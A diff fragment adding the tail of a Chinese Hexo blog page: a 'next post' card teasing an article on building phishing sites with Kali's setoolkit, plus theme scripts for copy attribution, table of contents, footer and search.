+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/04/05/kali-xia-diao-yu-wang-zhan-de-zhi-zuo/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="kali下钓鱼网站的制作">
+                        
+                        <span class="card-title">kali下钓鱼网站的制作</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            尽管当今互联网的安全措施已经很完善，但是还是会出现“被盗号”的情况，很多情况下是“有心人”的钓鱼网站导致的，今天的文章主要讲一下kali下使用setoolkit来制作钓鱼网站。
+setoolkit简介setoolkit是kali下的社会工程
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            xiao
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/渗透/" target="_blank">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('20')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: god_13<br />'
+            + 'Author: xiao<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">19.1k</span>
+            
+
+            
+			
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+
+
+    <a href="mailto:xxx@xx.xx" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=123123123" class="tooltipped" data-tooltip="QQ联系我: 123123123" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword" class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+
+</body>
+</html>
